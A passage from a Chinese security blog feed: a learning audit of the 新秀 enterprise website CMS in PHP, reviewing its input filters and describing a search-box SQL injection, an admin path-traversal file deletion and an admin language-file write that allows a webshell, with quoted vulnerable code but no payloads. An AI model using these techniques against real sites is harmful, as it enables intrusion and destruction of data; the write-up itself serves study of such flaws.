&lt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>新秀企业网站系统代码审计学习(复现)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>参考资料：</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">代码审计常见的三种方法（PHP篇）</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHP代码审计初次尝试之新秀企业网站系统</a></p><p>审计思路通过脑图大概总结如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="了解系统"><a href="#了解系统" class="headerlink" title="了解系统"></a>了解系统</h1><p><strong>CMS名称</strong>：新秀企业网站系统PHP版</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>看着界面就知道是用于企业打广告(x)和发布信息，招聘等功能的系统。且存在前台用户登录和后台管理系统。存在搜索功能。</p><h1 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h1><h2 id="IP登录限制-猜测伪造IP注入"><a href="#IP登录限制-猜测伪造IP注入" class="headerlink" title="IP登录限制 - 猜测伪造IP注入"></a>IP登录限制 - 猜测伪造IP注入</h2><p>限制了前台、后台的登录次数限制、注册限制、可能会影响到后面SQL注入漏洞的测试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>可能出现的漏洞：<strong>伪造IP进行注入攻击</strong></p><p>数据库监控，在注册的地方看看<code>ip</code> 是否被带入了数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>全局定位到获取用户iP的代码部分：</p><p>phpstorm 搜索 获取IP，即可。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取客户端IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，当ip 除去<code>.</code>  后，如果不是纯数字，那么就设置为 0.0.0.0 。因此通过伪造IP进行注入是行不通了。</p><h2 id="XSS-过滤"><a href="#XSS-过滤" class="headerlink" title="XSS 过滤"></a>XSS 过滤</h2><p>前台存在留言功能。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>提交后，我们登录后台管理员进行查看留言内容。 发现并没有执行js代码。</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;您的网站有了新的留言&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的输入是被传入了<code>post</code> 函数进行执行，跟进该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过了<code>strict</code> 条件的过滤函数，找到这个的定义处。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//严格过滤字符串中的危险符号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到html 的闭合标签被转义了，所以没法XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF 修改用户密码，需要旧密码，行不通。</p><h2 id="可控变量过滤"><a href="#可控变量过滤" class="headerlink" title="可控变量过滤"></a>可控变量过滤</h2><h3 id="session-过滤"><a href="#session-过滤" class="headerlink" title="session 过滤"></a>session 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-过滤"><a href="#cookie-过滤" class="headerlink" title="cookie 过滤"></a>cookie 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-登录"><a href="#admin-登录" class="headerlink" title="admin 登录"></a>admin 登录</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;对不起，用户名和密码不能为空&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;返回重新登录&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     ……</span><br></pre></td></tr></table></figure><h3 id="user-登录"><a href="#user-登录" class="headerlink" title="user 登录"></a>user 登录</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以看到，基本都经过了带有过滤的函数处理。所以像，SQL注入和XSS 这种需要构造特殊符号的漏洞几乎很难了</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>基于功能点去测，先高危后低危。后台一般防御较弱，从后台突破较容易。而后台存在的功能有：图片、文件、模板管理、删除、留言审核，等其他功能。</p><h2 id="前台搜索框SQL-注入"><a href="#前台搜索框SQL-注入" class="headerlink" title="前台搜索框SQL 注入"></a>前台搜索框SQL 注入</h2><p>开启MySQL 监控，然后再搜索框进行搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>如图，123，被带入SQL语句进行查询，单引号闭合。将关键字在整个文件夹中搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>这里先rawurldecode 解码，然后带入拼接进入查询。</p><p>然后下断点进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>直接上sqlmap。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="后台任意文件删除漏洞"><a href="#后台任意文件删除漏洞" class="headerlink" title="后台任意文件删除漏洞"></a>后台任意文件删除漏洞</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>此处采用了白名单的形式，只能删除 指定的三个目录下的文件。但是忽略了可以用<code>../</code>来绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr 从第<code>$path</code>的第一个字母开始往后判断，截取path前半部分长度和白名单是否相等，即是否是白名单里的那几个目录，是，然后<code>unlink</code>删除掉。</p><p>成功删除文件时，返回1。</p><p>这里我遇到了一个问题，就是这个域名是通过MAMP修改的本地HOSTS文件解析的，然后找到了一篇文章，<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0，简单设置一下就可以了。</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="漏洞演示"></p><h2 id="后台编辑语言文件设置GetShell"><a href="#后台编辑语言文件设置GetShell" class="headerlink" title="后台编辑语言文件设置GetShell"></a>后台编辑语言文件设置GetShell</h2><p>成功编辑后，回显 编辑语言包成功。那么在整个文件中搜索即可定位到代码。<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;编辑语言包成功&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;返回上一页&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数中，经过<code>post()</code> 函数过滤，但是对于<code>$lang_text</code> 的过滤规则是<code>no_filter</code> ，跟进查看一下该规则。</p><p>/include/function.php,104行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// 删除反斜杠</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有过滤 <code>$lang_text</code> 就通过<code>file_put_contents</code> 写入文件，那么这里就可以写WebShell。</p><p>同样的，下断点来调试分析。</p><p>step into ，慢慢点，可以看到这里没有任何过滤，写入webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> 可控的，这里只需要把<code>$path</code> 改为一个<code>.php</code> 后缀的就可以GetShell 了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="审计总结"><a href="#审计总结" class="headerlink" title="审计总结"></a>审计总结</h1><p>基本上是照搬照抄别人的思路来搞的，总比躺着玩手机强，也遇到了一些问题，比如Burp Suite 设置 域名和ip 